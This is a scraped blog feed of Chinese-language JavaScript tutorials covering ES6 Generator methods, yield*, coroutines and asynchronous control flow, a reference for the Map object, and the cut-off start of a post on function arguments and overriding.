上面代码中，遍历器对象i连续抛出两个错误。第一个错误被Generator函数体内的catch语句捕获。i第二次抛出错误，由于Generator函数内部的catch语句已经执行过了，不会再捕捉到这个错误了，所以这个错误就被抛出了Generator函数体，被函数体外的catch语句捕获。+ throw方法可以接受一个参数，该参数会被catch语句接收，建议抛出Error对象的实例。+ 123456789101112var g = function* () &#123;try &#123;yield;&#125; catch (e) &#123;console.log(e);&#125;&#125;;var i = g();i.next();i.throw(new Error('出错了！'));// Error: 出错了！(…) 注意，不要混淆遍历器对象的throw方法和全局的throw命令。上面代码的错误，是用遍历器对象的throw方法抛出的，而不是用throw命令抛出的。后者只能被函数体外的catch语句捕获。+ 123456789101112131415161718192021var g = function* () &#123;while (true) &#123;try &#123;yield;&#125; catch (e) &#123;if (e != 'a') throw e;console.log('内部捕获', e);&#125;&#125;&#125;;var i = g();i.next();try &#123;throw new Error('a');throw new Error('b');&#125; catch (e) &#123;console.log('外部捕获', e);&#125;// 外部捕获 [Error: a] 上面代码中，Generator函数g内部没有部署try…catch代码块，所以抛出的错误直接被外部catch代码块捕获。+ 如果Generator函数内部和外部，都没有部署try…catch代码块，那么程序将报错，直接中断执行。+ 12345678910var gen = function* gen()&#123;yield console.log('hello');yield console.log('world');&#125;var g = gen();g.next();g.throw();// hello// Uncaught undefined 上面代码中，g.throw抛出错误以后，没有任何try…catch代码块可以捕获这个错误，导致程序报错，中断执行。+ throw方法被捕获以后，会附带执行下一条yield语句。也就是说，会附带执行一次next方法。+ 1234567891011121314var gen = function* gen()&#123;try &#123;yield console.log('a');&#125; catch (e) &#123;// ...&#125;yield console.log('b');yield console.log('c');&#125;var g = gen();g.next() // ag.throw() // bg.next() // c 上面代码中，g.throw方法被捕获以后，自动执行了一次next方法，所以会打印b。另外，也可以看到，只要Generator函数内部部署了try…catch代码块，那么遍历器的throw方法抛出的错误，不影响下一次遍历。 另外，throw命令与g.throw方法是无关的，两者互不影响。+ 123456789101112131415var gen = function* gen()&#123;yield console.log('hello');yield console.log('world');&#125;var g = gen();g.next();try &#123;throw new Error();&#125; catch (e) &#123;g.next();&#125;// hello// world 上面代码中，throw命令抛出的错误不会影响到遍历器的状态，所以两次执行next方法，都进行了正确的操作。+ 这种函数体内捕获错误的机制，大大方便了对错误的处理。多个yield语句，可以只用一个try…catch代码块来捕获错误。如果使用回调函数的写法，想要捕获多个错误，就不得不为每个函数内部写一个错误处理语句，现在只在Generator函数内部写一次catch语句就可以了。+ Generator函数体外抛出的错误，可以在函数体内捕获；反过来，Generator函数体内抛出的错误，也可以被函数体外的catch捕获。 123456789101112131415function *foo() &#123;var x = yield 3;var y = x.toUpperCase();yield y;&#125;var it = foo();it.next(); // &#123; value:3, done:false &#125;try &#123;it.next(42);&#125; catch (err) &#123;console.log(err);&#125; 上面代码中，第二个next方法向函数体内传入一个参数42，数值是没有toUpperCase方法的，所以会抛出一个TypeError错误，被函数体外的catch捕获。+ 一旦Generator执行过程中抛出错误，且没有被内部捕获，就不会再执行下去了。如果此后还调用next方法，将返回一个value属性等于undefined、done属性等于true的对象，即JavaScript引擎认为这个Generator已经运行结束了。 123456789101112131415161718192021222324252627282930313233343536373839function* g() &#123;yield 1;console.log('throwing an exception');throw new Error('generator broke!');yield 2;yield 3;&#125;function log(generator) &#123;var v;console.log('starting generator');try &#123;v = generator.next();console.log('第一次运行next方法', v);&#125; catch (err) &#123;console.log('捕捉错误', v);&#125;try &#123;v = generator.next();console.log('第二次运行next方法', v);&#125; catch (err) &#123;console.log('捕捉错误', v);&#125;try &#123;v = generator.next();console.log('第三次运行next方法', v);&#125; catch (err) &#123;console.log('捕捉错误', v);&#125;console.log('caller done');&#125;log(g());// starting generator// 第一次运行next方法 &#123; value: 1, done: false &#125;// throwing an exception// 捕捉错误 &#123; value: 1, done: false &#125;// 第三次运行next方法 &#123; value: undefined, done: true &#125;// caller done 上面代码一共三次运行next方法，第二次运行的时候会抛出错误，然后第三次运行的时候，Generator函数就已经结束了，不再执行下去了。+ Generator.prototype.return()Generator函数返回的遍历器对象，还有一个return方法，可以返回给定的值，并且终结遍历Generator函数。+ 1234567891011function* gen() &#123;yield 1;yield 2;yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return('foo') // &#123; value: "foo", done: true &#125;g.next() // &#123; value: undefined, done: true &#125; 上面代码中，遍历器对象g调用return方法后，返回值的value属性就是return方法的参数foo。并且，Generator函数的遍历就终止了，返回值的done属性为true，以后再调用next方法，done属性总是返回true。 如果return方法调用时，不提供参数，则返回值的value属性为undefined。+ 12345678910function* gen() &#123;yield 1;yield 2;yield 3;&#125;var g = gen();g.next() // &#123; value: 1, done: false &#125;g.return() // &#123; value: undefined, done: true &#125; 如果Generator函数内部有try…finally代码块，那么return方法会推迟到finally代码块执行完再执行。+ 1234567891011121314151617function* numbers () &#123;yield 1;try &#123;yield 2;yield 3;&#125; finally &#123;yield 4;yield 5;&#125;yield 6;&#125;var g = numbers()g.next() // &#123; done: false, value: 1 &#125;g.next() // &#123; done: false, value: 2 &#125;g.return(7) // &#123; done: false, value: 4 &#125;g.next() // &#123; done: false, value: 5 &#125;g.next() // &#123; done: true, value: 7 &#125; 上面代码中，调用return方法后，就开始执行finally代码块，然后等到finally代码块执行完，再执行return方法。+ yield*语句如果在Generater函数内部，调用另一个Generator函数，默认情况下是没有效果的。+ 12345678910111213141516function* foo() &#123;yield 'a';yield 'b';&#125;function* bar() &#123;yield 'x';foo();yield 'y';&#125;for (let v of bar())&#123;console.log(v);&#125;// "x"// "y" 上面代码中，foo和bar都是Generator函数，在bar里面调用foo，是不会有效果的。+ 这个就需要用到yield*语句，用来在一个Generator函数里面执行另一个Generator函数。 123456789101112131415161718192021222324252627282930function* bar() &#123;yield 'x';yield* foo();yield 'y';&#125;// 等同于function* bar() &#123;yield 'x';yield 'a';yield 'b';yield 'y';&#125;// 等同于function* bar() &#123;yield 'x';for (let v of foo()) &#123;yield v;&#125;yield 'y';&#125;for (let v of bar())&#123;console.log(v);&#125;// "x"// "a"// "b"// "y" 再来看一个对比的例子。 12345678910111213141516171819202122232425function* inner() &#123;yield 'hello!';&#125;function* outer1() &#123;yield 'open';yield inner();yield 'close';&#125;var gen = outer1()gen.next().value // "open"gen.next().value // 返回一个遍历器对象gen.next().value // "close"function* outer2() &#123;yield 'open'yield* inner()yield 'close'&#125;var gen = outer2()gen.next().value // "open"gen.next().value // "hello!"gen.next().value // "close" 上面例子中，outer2使用了yield*，outer1没使用。结果就是，outer1返回一个遍历器对象，outer2返回该遍历器对象的内部值。+ 从语法角度看，如果yield命令后面跟的是一个遍历器对象，需要在yield命令后面加上星号，表明它返回的是一个遍历器对象。这被称为yield*语句。+ 123456789101112131415161718let delegatedIterator = (function* () &#123;yield 'Hello!';yield 'Bye!';&#125;());let delegatingIterator = (function* () &#123;yield 'Greetings!';yield* delegatedIterator;yield 'Ok, bye.';&#125;());for(let value of delegatingIterator) &#123;console.log(value);&#125;// "Greetings!// "Hello!"// "Bye!"// "Ok, bye." 上面代码中，delegatingIterator是代理者，delegatedIterator是被代理者。由于yield* delegatedIterator语句得到的值，是一个遍历器，所以要用星号表示。运行结果就是使用一个遍历器，遍历了多个Generator函数，有递归的效果。+ yield*后面的Generator函数（没有return语句时），等同于在Generator函数内部，部署一个for…of循环。+ 123456789101112131415function* concat(iter1, iter2) &#123;yield* iter1;yield* iter2;&#125;// 等同于function* concat(iter1, iter2) &#123;for (var value of iter1) &#123;yield value;&#125;for (var value of iter2) &#123;yield value;&#125;&#125; 上面代码说明，yield后面的Generator函数（没有return语句时），不过是for…of的一种简写形式，完全可以用后者替代前者。反之，则需要用var value = yield iterator的形式获取return语句的值。+ 如果yield*后面跟着一个数组，由于数组原生支持遍历器，因此就会遍历数组成员。+ 12345function* gen()&#123;yield* ["a", "b", "c"];&#125;gen().next() // &#123; value:"a", done:false &#125; 上面代码中，yield命令后面如果不加星号，返回的是整个数组，加了星号就表示返回的是数组的遍历器对象。 实际上，任何数据结构只要有Iterator接口，就可以被yield*遍历。 1234567let read = (function* () &#123;yield 'hello';yield* 'hello';&#125;)();read.next().value // "hello"read.next().value // "h" 上面代码中，yield语句返回整个字符串，yield语句返回单个字符。因为字符串具有Iterator接口，所以被yield遍历。 如果被代理的Generator函数有return语句，那么就可以向代理它的Generator函数返回数据。 1234567891011121314151617181920212223242526function *foo() &#123;yield 2;yield 3;return "foo";&#125;function *bar() &#123;yield 1;var v = yield *foo();console.log( "v: " + v );yield 4;&#125;var it = bar();it.next()// &#123;value: 1, done: false&#125;it.next()// &#123;value: 2, done: false&#125;it.next()// &#123;value: 3, done: false&#125;it.next();// "v: foo"// &#123;value: 4, done: false&#125;it.next()// &#123;value: undefined, done: true&#125; 上面代码在第四次调用next方法的时候，屏幕上会有输出，这是因为函数foo的return语句，向函数bar提供了返回值。 再看一个例子。 12345678910111213function* genFuncWithReturn() &#123;yield 'a';yield 'b';return 'The result';&#125;function* logReturned(genObj) &#123;let result = yield* genObj;console.log(result);&#125;[...logReturned(genFuncWithReturn())]// The result// 值为 [ 'a', 'b' ] 上面代码中，存在两次遍历。第一次是扩展运算符遍历函数logReturned返回的遍历器对象，第二次是yield语句遍历函数genFuncWithReturn返回的遍历器对象。这两次遍历的效果是叠加的，最终表现为扩展运算符遍历函数genFuncWithReturn返回的遍历器对象。所以，最后的数据表达式得到的值等于[ ‘a’, ‘b’ ]。但是，函数genFuncWithReturn的return语句的返回值The result，会返回给函数logReturned内部的result变量，因此会有终端输出。yield命令可以很方便地取出嵌套数组的所有成员。+ 1234567891011121314151617181920function* iterTree(tree) &#123;if (Array.isArray(tree)) &#123;for(let i=0; i &lt; tree.length; i++) &#123;yield* iterTree(tree[i]);&#125;&#125; else &#123;yield tree;&#125;&#125;const tree = [ 'a', ['b', 'c'], ['d', 'e'] ];for(let x of iterTree(tree)) &#123;console.log(x);&#125;// a// b// c// d// e 下面是一个稍微复杂的例子，使用yield*语句遍历完全二叉树。+ 1234567891011121314151617181920212223242526272829303132333435// 下面是二叉树的构造函数，// 三个参数分别是左树、当前节点和右树function Tree(left, label, right) &#123;this.left = left;this.label = label;this.right = right;&#125;// 下面是中序（inorder）遍历函数。// 由于返回的是一个遍历器，所以要用generator函数。// 函数体内采用递归算法，所以左树和右树要用yield*遍历function* inorder(t) &#123;if (t) &#123;yield* inorder(t.left);yield t.label;yield* inorder(t.right);&#125;&#125;// 下面生成二叉树function make(array) &#123;// 判断是否为叶节点if (array.length == 1) return new Tree(null, array[0], null);return new Tree(make(array[0]), array[1], make(array[2]));&#125;let tree = make([[['a'], 'b', ['c']], 'd', [['e'], 'f', ['g']]]);// 遍历二叉树var result = [];for (let node of inorder(tree)) &#123;result.push(node);&#125;result// ['a', 'b', 'c', 'd', 'e', 'f', 'g'] 作为对象属性的Generator函数如果一个对象的属性是Generator函数，可以简写成下面的形式。+ 12345let obj = &#123;* myGeneratorMethod() &#123;···&#125;&#125;; 上面代码中，myGeneratorMethod属性前面有一个星号，表示这个属性是一个Generator函数。+ 它的完整形式如下，与上面的写法是等价的。+ 12345let obj = &#123;myGeneratorMethod: function* () &#123;// ···&#125;&#125;; Generator函数的thisGenerator函数总是返回一个遍历器，ES6规定这个遍历器是Generator函数的实例，也继承了Generator函数的prototype对象上的方法。 12345678910function* g() &#123;&#125;g.prototype.hello = function () &#123;return 'hi!';&#125;;let obj = g();obj instanceof g // trueobj.hello() // 'hi!' 上面代码表明，Generator函数g返回的遍历器obj，是g的实例，而且继承了g.prototype。但是，如果把g当作普通的构造函数，并不会生效，因为g返回的总是遍历器对象，而不是this对象。+ 123456function* g() &#123;this.a = 11;&#125;let obj = g();obj.a // undefined 上面代码中，Generator函数g在this对象上面添加了一个属性a，但是obj对象拿不到这个属性。+ Generator函数也不能跟new命令一起用，会报错。 1234567function* F() &#123;yield this.x = 2;yield this.y = 3;&#125;new F()// TypeError: F is not a constructor 上面代码中，new命令跟构造函数F一起使用，结果报错，因为F不是构造函数。那么，有没有办法让Generator函数返回一个正常的对象实例，既可以用next方法，又可以获得正常的this？下面是一个变通方法。首先，生成一个空对象，使用bind方法绑定Generator函数内部的this。这样，构造函数调用以后，这个空对象就是Generator函数的实例对象了。 123456789101112131415function* F() &#123;this.a = 1;yield this.b = 2;yield this.c = 3;&#125;var obj = &#123;&#125;;var f = F.call(obj);f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;obj.a // 1obj.b // 2obj.c // 3 上面代码中，首先是F内部的this对象绑定obj对象，然后调用它，返回一个Iterator对象。这个对象执行三次next方法（因为F内部有两个yield语句），完成F内部所有代码的运行。这时，所有内部属性都绑定在obj对象上了，因此obj对象也就成了F的实例。+ 上面代码中，执行的是遍历器对象f，但是生成的对象实例是obj，有没有办法将这两个对象统一呢？一个办法就是将obj换成F.prototype。 1234567891011121314function* F() &#123;this.a = 1;yield this.b = 2;yield this.c = 3;&#125;var f = F.call(F.prototype);f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;f.a // 1f.b // 2f.c // 3 再将F改成构造函数，就可以对它执行new命令了。+ 12345678910111213141516171819function* gen() &#123;this.a = 1;yield this.b = 2;yield this.c = 3;&#125;function F() &#123;return gen.call(gen.prototype);&#125;var f = new F();f.next(); // Object &#123;value: 2, done: false&#125;f.next(); // Object &#123;value: 3, done: false&#125;f.next(); // Object &#123;value: undefined, done: true&#125;f.a // 1f.b // 2f.c // 3 含义Generator与状态机Generator是实现状态机的最佳结构。比如，下面的clock函数就是一个状态机。+ 12345678var ticking = true;var clock = function() &#123; if (ticking) console.log('Tick!'); else console.log('Tock!'); ticking = !ticking;&#125; 上面代码的clock函数一共有两种状态（Tick和Tock），每运行一次，就改变一次状态。这个函数如果用Generator实现，就是下面这样。+ 12345678var clock = function*() &#123; while (true) &#123; console.log('Tick!'); yield; console.log('Tock!'); yield; &#125;&#125;; 上面的Generator实现与ES5实现对比，可以看到少了用来保存状态的外部变量ticking，这样就更简洁，更安全（状态不会被非法篡改）、更符合函数式编程的思想，在写法上也更优雅。Generator之所以可以不用外部变量保存状态，是因为它本身就包含了一个状态信息，即目前是否处于暂停态。 Generator与协程协程（coroutine）是一种程序运行的方式，可以理解成“协作的线程”或“协作的函数”。协程既可以用单线程实现，也可以用多线程实现。前者是一种特殊的子例程，后者是一种特殊的线程。+ 协程与子例程的差异传统的“子例程”（subroutine）采用堆栈式“后进先出”的执行方式，只有当调用的子函数完全执行完毕，才会结束执行父函数。协程与其不同，多个线程（单线程情况下，即多个函数）可以并行执行，但是只有一个线程（或函数）处于正在运行的状态，其他线程（或函数）都处于暂停态（suspended），线程（或函数）之间可以交换执行权。也就是说，一个线程（或函数）执行到一半，可以暂停执行，将执行权交给另一个线程（或函数），等到稍后收回执行权的时候，再恢复执行。这种可以并行执行、交换执行权的线程（或函数），就称为协程。 从实现上看，在内存中，子例程只使用一个栈（stack），而协程是同时存在多个栈，但只有一个栈是在运行状态，也就是说，协程是以多占用内存为代价，实现多任务的并行。+ 协程与普通线程的差异+不难看出，协程适合用于多任务运行的环境。在这个意义上，它与普通的线程很相似，都有自己的执行上下文、可以分享全局变量。它们的不同之处在于，同一时间可以有多个线程处于运行状态，但是运行的协程只能有一个，其他协程都处于暂停状态。此外，普通的线程是抢先式的，到底哪个线程优先得到资源，必须由运行环境决定，但是协程是合作式的，执行权由协程自己分配。+ 由于ECMAScript是单线程语言，只能保持一个调用栈。引入协程以后，每个任务可以保持自己的调用栈。这样做的最大好处，就是抛出错误的时候，可以找到原始的调用栈。不至于像异步操作的回调函数那样，一旦出错，原始的调用栈早就结束。+ Generator函数是ECMAScript 6对协程的实现，但属于不完全实现。Generator函数被称为“半协程”（semi-coroutine），意思是只有Generator函数的调用者，才能将程序的执行权还给Generator函数。如果是完全执行的协程，任何函数都可以让暂停的协程继续执行。+ 如果将Generator函数当作协程，完全可以将多个需要互相协作的任务写成Generator函数，它们之间使用yield语句交换控制权。+ 应用Generator可以暂停函数执行，返回任意表达式的值。这种特点使得Generator有多种应用场景。+ 异步操作的同步化表达Generator函数的暂停执行的效果，意味着可以把异步操作写在yield语句里面，等到调用next方法时再往后执行。这实际上等同于不需要写回调函数了，因为异步操作的后续操作可以放在yield语句下面，反正要等到调用next方法时再执行。所以，Generator函数的一个重要实际意义就是用来处理异步操作，改写回调函数。+ 1234567891011function* loadUI() &#123; showLoadingScreen(); yield loadUIDataAsynchronously(); hideLoadingScreen();&#125;var loader = loadUI();// 加载UIloader.next()// 卸载UIloader.next() 上面代码表示，第一次调用loadUI函数时，该函数不会执行，仅返回一个遍历器。下一次对该遍历器调用next方法，则会显示Loading界面，并且异步加载数据。等到数据加载完成，再一次使用next方法，则会隐藏Loading界面。可以看到，这种写法的好处是所有Loading界面的逻辑，都被封装在一个函数，按部就班非常清晰。+ Ajax是典型的异步操作，通过Generator函数部署Ajax操作，可以用同步的方式表达。+ 1234567891011121314function* main() &#123; var result = yield request("http://some.url"); var resp = JSON.parse(result); console.log(resp.value);&#125;function request(url) &#123; makeAjaxCall(url, function(response)&#123; it.next(response); &#125;);&#125;var it = main();it.next(); 上面代码的main函数，就是通过Ajax操作获取数据。可以看到，除了多了一个yield，它几乎与同步操作的写法完全一样。注意，makeAjaxCall函数中的next方法，必须加上response参数，因为yield语句构成的表达式，本身是没有值的，总是等于undefined。+ 下面是另一个例子，通过Generator函数逐行读取文本文件。+ 12345678910function* numbers() &#123; let file = new FileReader("numbers.txt"); try &#123; while(!file.eof) &#123; yield parseInt(file.readLine(), 10); &#125; &#125; finally &#123; file.close(); &#125;&#125; 上面代码打开文本文件，使用yield语句可以手动逐行读取文件。+ 控制流管理如果有一个多步操作非常耗时，采用回调函数，可能会写成下面这样。+ 123456789step1(function (value1) &#123; step2(value1, function(value2) &#123; step3(value2, function(value3) &#123; step4(value3, function(value4) &#123; // Do something with value4 &#125;); &#125;); &#125;);&#125;); 采用Promise改写上面的代码。+ 12345678910Q.fcall(step1) .then(step2) .then(step3) .then(step4) .then(function (value4) &#123; // Do something with value4 &#125;, function (error) &#123; // Handle any error from step1 through step4 &#125;) .done(); 上面代码已经把回调函数，改成了直线执行的形式，但是加入了大量Promise的语法。Generator函数可以进一步改善代码运行流程。+ 1234567891011function* longRunningTask() &#123; try &#123; var value1 = yield step1(); var value2 = yield step2(value1); var value3 = yield step3(value2); var value4 = yield step4(value3); // Do something with value4 &#125; catch (e) &#123; // Handle any error from step1 through step4 &#125;&#125; 然后，使用一个函数，按次序自动执行所有步骤。+ 123456789101112scheduler(longRunningTask());function scheduler(task) &#123; setTimeout(function() &#123; var taskObj = task.next(task.value); // 如果Generator函数未结束，就继续调用 if (!taskObj.done) &#123; task.value = taskObj.value scheduler(task); &#125; &#125;, 0);&#125; 注意，yield语句是同步运行，不是异步运行（否则就失去了取代回调函数的设计目的了）。实际操作中，一般让yield语句返回Promise对象。+ 1234567891011var Q = require('q');function delay(milliseconds) &#123; var deferred = Q.defer(); setTimeout(deferred.resolve, milliseconds); return deferred.promise;&#125;function* f()&#123; yield delay(100);&#125;; 上面代码使用Promise的函数库Q，yield语句返回的就是一个Promise对象。如果yield语句后面的参数，是一个具有遍历器接口的对象，yield会遍历这个对象，再往下执行。这意味着，多个任务按顺序一个接一个执行时，yield语句可以按顺序排列。多个任务需要并列执行时（比如只有A任务和B任务都执行完，才能执行C任务），可以采用数组的写法。 1234567function* parallelTasks() &#123; let [resultA, resultB] = yield [ taskA(), taskB() ]; console.log(resultA, resultB);&#125; 上面代码中，yield语句的参数是一个数组，成员就是两个任务taskA和taskB，只有等这两个任务都完成了，才会接着执行下面的语句。+ 部署iterator接口利用Generator函数，可以在任意对象上部署iterator接口。+ 12345678910111213141516function* iterEntries(obj) &#123; let keys = Object.keys(obj); for (let i=0; i &lt; keys.length; i++) &#123; let key = keys[i]; yield [key, obj[key]]; &#125;&#125;let myObj = &#123; foo: 3, bar: 7 &#125;;for (let [key, value] of iterEntries(myObj)) &#123; console.log(key, value);&#125;// foo 3// bar 7 上述代码中，myObj是一个普通对象，通过iterEntries函数，就有了iterator接口。也就是说，可以在任意对象上部署next方法。下面是一个对数组部署Iterator接口的例子，尽管数组原生具有这个接口。 12345678910111213function* makeSimpleGenerator(array)&#123; var nextIndex = 0; while(nextIndex &lt; array.length)&#123; yield array[nextIndex++]; &#125;&#125;var gen = makeSimpleGenerator(['yo', 'ya']);gen.next().value // 'yo'gen.next().value // 'ya'gen.next().done // true 作为数据结构Generator可以看作是数据结构，更确切地说，可以看作是一个数组结构，因为Generator函数可以返回一系列的值，这意味着它可以对任意表达式，提供类似数组的接口。+ 12345function *doStuff() &#123; yield fs.readFile.bind(null, 'hello.txt'); yield fs.readFile.bind(null, 'world.txt'); yield fs.readFile.bind(null, 'and-such.txt');&#125; 上面代码就是依次返回三个函数，但是由于使用了Generator函数，导致可以像处理数组那样，处理这三个返回的函数。+ 123for (task of doStuff()) &#123; // task是一个函数，可以像回调函数那样使用它&#125; 实际上，如果用ES5表达，完全可以用数组模拟Generator的这种用法。+ 1234567function doStuff() &#123; return [ fs.readFile.bind(null, 'hello.txt'), fs.readFile.bind(null, 'world.txt'), fs.readFile.bind(null, 'and-such.txt') ];&#125; 上面的函数，可以用一模一样的for…of循环处理！两相一比较，就不难看出Generator使得数据或者操作，具备了类似数组的接口。+]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Map]]></title>
    <url>%2F2018%2F01%2F03%2Fmap%2F</url>
    <content type="text"><![CDATA[Map 对象保存键值对。任何值(对象或者原始值) 都可以作为一个键或一个值。引用：官方文档WeakMap详解 语法1new Map([iterable]) 参数iterable:Iterable 可以是一个数组或者其他 iterable 对象，其元素或为键值对，或为两个元素的数组。 每个键值对都会添加到新的 Map。null 会被当做 undefined。 描述一个Map对象以插入顺序迭代其元素 — 一个 for...of 循环为每次迭代返回一个[key，value]数组。 键的相等(Key equality)键的比较是基于 &quot;SameValueZero&quot; 算法：NaN 是与 NaN 相同的（虽然 NaN !== NaN），剩下所有其它的值是根据 === 运算符的结果判断是否相等。在目前的ECMAScript规范中，-0和+0被认为是相等的，尽管这在早期的草案中并不是这样。有关详细信息，请参阅浏览器兼容性 表中的“value equality for -0 and 0”。 Objects 和 maps 的比较Object 和 Map类似的一点是,它们都允许你按键存取一个值,都可以删除键,还可以检测一个键是否绑定了值.因此,一直以来,我们都把对象当成Map来使用,不过,现在有了Map,下面的区别解释了为什么使用Map更好点. 一个对象通常都有自己的原型,所以一个对象总有一个”prototype”键。不过，从 ES5 开始可以使用 map = Object.create(null)来创建一个没有原型的对象。 一个对象的键只能是字符串或者 Symbols，但一个 Map 的键可以是任意值。 你可以通过size属性很容易地得到一个Map的键值对个数，而对象的键值对个数只能手动确认。 但是这并不意味着你可以随意使用 Map，对象仍旧是最常用的。Map 实例只适合用于集合(collections)，你应当考虑修改你原来的代码——先前使用对象来处理集合的地方。对象应该用其字段和方法来作为记录的。 如果你不确定要使用哪个，请思考下面的问题： 在运行之前 key 是否是未知的，是否需要动态地查询 key 呢？ 是否所有的值都是统一类型，这些值可以互换么？ 是否需要不是字符串类型的 key ？ 键值对经常增加或者删除么？ 是否有任意个且非常容易改变的键值对? 这个集合可以遍历么(Is the collection iterated)? 假如以上全是“是”的话，那么你需要用Map 来保存这个集。 相反，你有固定数目的键值对，独立操作它们，区分它们的用法，那么你需要的是对象。 属性 属性 Map.length 属性 length 的值为 0 。 get Map[@@species] 本构造函数用于创建派生对象。 Map.prototype 表示 Map构造器的原型。 允许添加属性从而应用于所有的Map 对象。 Map 实例所有的 Map 对象实例都会继承 Map.prototype。 属性 Map.prototype.constructor 返回一个函数，它创建了实例的原型。默认是Map函数。 Map.prototype.size 返回Map对象的键/值对的数量。 方法 Map.prototype.clear() 移除Map对象的所有键/值对 。 Map.prototype.delete(key) 移除任何与键相关联的值，并且返回该值，该值在之前会被Map.prototype.has(key)返回为true。之后再调用Map.prototype.has(key)会返回false。 Map.prototype.entries() 返回一个新的 Iterator 对象，它按插入顺序包含了Map对象中每个元素的 [key, value] 数组。 Map.prototype.forEach(callbackFn[, thisArg]) 按插入顺序，为 Map对象里的每一键值对调用一次callbackFn函数。如果为forEach提供了thisArg，它将在每次回调中作为this值。 Map.prototype.get(key) 返回键对应的值，如果不存在，则返回undefined。 Map.prototype.has(key) 返回一个布尔值，表示Map实例是否包含键对应的值。 Map.prototype.keys() 返回一个新的 Iterator对象， 它按插入顺序包含了Map对象中每个元素的键 。 Map.prototype.set(key, value) 设置Map对象中键的值。返回该Map对象。 Map.prototype.values() 返回一个新的Iterator对象，它按插入顺序包含了Map对象中每个元素的值 。 Map.prototype[@@iterator]() 返回一个新的Iterator对象，它按插入顺序包含了Map对象中每个元素的 [key, value]数组。 示例使用映射对象 12345678910111213141516171819202122var myMap = new Map();var keyObj = &#123;&#125;, keyFunc = function () &#123;&#125;, keyString = "a string";// 添加键myMap.set(keyString, "和键'a string'关联的值");myMap.set(keyObj, "和键keyObj关联的值");myMap.set(keyFunc, "和键keyFunc关联的值");myMap.size; // 3// 读取值myMap.get(keyString); // "和键'a string'关联的值"myMap.get(keyObj); // "和键keyObj关联的值"myMap.get(keyFunc); // "和键keyFunc关联的值"myMap.get("a string"); // "和键'a string'关联的值" // 因为keyString === 'a string'myMap.get(&#123;&#125;); // undefined, 因为keyObj !== &#123;&#125;myMap.get(function() &#123;&#125;) // undefined, 因为keyFunc !== function () &#123;&#125; 将NaN作为映射的键NaN也可以作为Map对象的键. 虽然 NaN 和任何值甚至和自己都不相等(NaN !== NaN 返回true), 但下面的例子表明, 两个NaN作为Map的键来说是没有区别的: 1234567var myMap = new Map();myMap.set(NaN, "not a number");myMap.get(NaN); // "not a number"var otherNaN = Number("foo");myMap.get(otherNaN); // "not a number" 使用for..of方法迭代映射映射也可以使用for..of循环来实现迭代： 12345678910111213141516171819202122var myMap = new Map();myMap.set(0, "zero");myMap.set(1, "one");for (var [key, value] of myMap) &#123; console.log(key + " = " + value);&#125;// 将会显示两个log。一个是"0 = zero"另一个是"1 = one"for (var key of myMap.keys()) &#123; console.log(key);&#125;// 将会显示两个log。 一个是 "0" 另一个是 "1"for (var value of myMap.values()) &#123; console.log(value);&#125;// 将会显示两个log。 一个是 "zero" 另一个是 "one"for (var [key, value] of myMap.entries()) &#123; console.log(key + " = " + value);&#125;// 将会显示两个log。 一个是 "0 = zero" 另一个是 "1 = one" 使用forEach()方法迭代映射映射也可以通过forEach()方法迭代： 1234myMap.forEach(function(value, key) &#123; console.log(key + " = " + value);&#125;, myMap)// 将会显示两个logs。 一个是 "0 = zero" 另一个是 "1 = one" 映射与数组对象的关系 123456789101112var kvArray = [["key1", "value1"], ["key2", "value2"]];// 使用映射对象常规的构造函数将一个二维键值对数组对象转换成一个映射关系var myMap = new Map(kvArray);myMap.get("key1"); // 返回值为 "value1"// 使用展开运算符将一个映射关系转换成一个二维键值对数组对象console.log(uneval([...myMap])); // 将会向您显示和kvArray相同的数组// 或者使用展开运算符作用在键或者值的迭代器上，进而得到只含有键或者值得数组console.log(uneval([...myMap.keys()])); // 输出 ["key1", "key2"]]]></content>
      <categories>
        <category>javaScript</category>
      </categories>
      <tags>
        <tag>es6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[继承中方法属性的重写]]></title>
    <url>%2F2018%2F01%2F02%2Fji-cheng-zhong-fang-fa-shu-xing-de-zhong-xie%2F</url>
    <content type="text"><![CDATA[继承中方法属性的重写123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163function F()&#123;&#125;;var f = new F();f.name = "cf";f.hasOwnProperty("name");//trueF.prototype.age = 22;f.hasOwnProperty("age");//false,age是原型对象的属性，name是F对象的属性，不是同一个。hasOwnProperty是对象的方法F.prototype.isPrototypeOf(f);//true//多态：编译时多态，运行时多态：方法重载、重写//js不支持同名的方法var o = &#123;run:function()&#123;&#125;,run:function()&#123;&#125;, //js同名会覆盖，run指向的是这个函数对象的地址，地址名加小括号就是这个类对象开始执行。function F()&#123;&#125; 既是类也是对象，new F()说明是一个类，F()函数名加小括号就是函数执行，说明是一个对象。&#125;=======================================================================function demo (a,b) &#123; console.log(demo.length);//形参个数，2 console.log(arguments.length);//实参个数，3 console.log(arguments[0]); console.log(arguments[1]);&#125;demo(4,5,6);function add()&#123; var total = 0; for (var i = arguments.length - 1; i &gt;= 0; i--) &#123; total += arguments[i]; &#125;; return total;&#125;console.log(add(1));console.log(add(1,2));//可变长度function fontSize()&#123; var ele = document.getElementById("js"); if (arguments.length == 0)&#123; return ele.style.fontSize; &#125;else&#123; ele.style.fontSize = arguments[0]; &#125;&#125;fontSize(18);console.log(fontSize());function setting()&#123; var ele = document.getElementById("js"); if (typeof arguments[0] ==="object")&#123; for(p in arguments[0])&#123;//p是key,arguments[p]是value, ele.style[p] = arguments[0][p]; &#125; &#125;else&#123; ele.style.fontSize = arguments[0]; ele.style.backgroundColor= arguments[1]; &#125;&#125;setting(18,"red");setting(&#123;fontSize:20,backgroundColor:"green"&#125;);//js里面不能写同名的方法，所以只能够对方法的参数做判断，==========================================================================function demo(o)&#123;//demo是一个类，o是类的对象属性 o.run();//调用属性的方法&#125;var o = &#123;run:function()&#123; console.log("o is running...");&#125;&#125;;demo(o);//类调用，java里面类不可以调用,这是跟java不一样的。var p 